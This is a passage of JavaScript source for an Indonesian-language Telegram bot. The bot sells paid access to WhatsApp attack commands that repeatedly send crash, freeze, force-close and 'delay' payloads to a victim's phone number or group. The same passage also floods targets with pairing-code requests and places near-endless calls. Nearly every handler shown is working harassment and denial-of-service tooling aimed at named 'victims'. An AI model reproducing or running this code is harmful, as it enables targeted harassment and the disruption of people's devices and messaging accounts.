    });

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await KhasJawaDelayHard(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit caption foto menjadi sukses (tombol hijau)
    await bot.editMessageCaption(
      `\`\`\`
# SUKSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY HARD
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayInvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/delayInvis"] === true) {
    return bot.sendMessage(chatId, "❌ Command /delayInvis sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /delayInvis`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "BUY AKSES DULU SONO SAMA IKKY IMUT",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Kirim foto dengan caption proses (tombol merah)
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
# PROSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY INVIS
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
      },
    });

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await XTridelayinfiniy(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit caption foto menjadi sukses (tombol hijau)
    await bot.editMessageCaption(
      `\`\`\`
# SUKSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY INVIS
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


//===== CASE BUG ANDRO BEBAS SPAM ======//
bot.onText(/\/freeze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/freeze"] === true) {
    return bot.sendMessage(chatId, "❌ Command /freeze sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /freeze`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await KhasJawaForclose(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/delay"] === true) {
    return bot.sendMessage(chatId, "❌ Command /delay sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /delay`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await KhasJawaDelayHard(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/forceClose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/forceClose"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forceClose sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /forceClose`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "BUY AKSES DULU SONO SAMA IKKY IMUT",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Kirim foto dengan caption proses (tombol merah)
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
# PROSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : FORCE CLOSE
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
      },
    });

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await KhasJawaForclose(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit caption foto menjadi sukses (tombol hijau)
    await bot.editMessageCaption(
      `\`\`\`
# SUKSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : FORCE CLOSE
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/blank"] === true) {
    return bot.sendMessage(chatId, "❌ Command /blank sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /blank`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await blankNew(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`LU SIAPA? JOIN SALURAN DULU KALO MAU DI KASI AKSES, JANGAN LUPA CHAT SEN\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐒𝐀𝐋𝐔𝐑𝐀𝐍 𝐒𝐄𝐍",
              url: "https://whatsapp.com/channel/0029VakXfJW5PO12maxNk33j",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: frezegroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 1000; i++) {
            await DelayGroup(groupId.id);
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/6kyeoi.jpg", {
        caption: `
\`\`\`
#SUCCES BUG❗
- status : Success
- Link : ${groupLink}
\`\`\`
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/6kyeoi.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐕𝐀𝐍𝐓𝐇𝐑𝐀 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Senzy😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("senzyreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
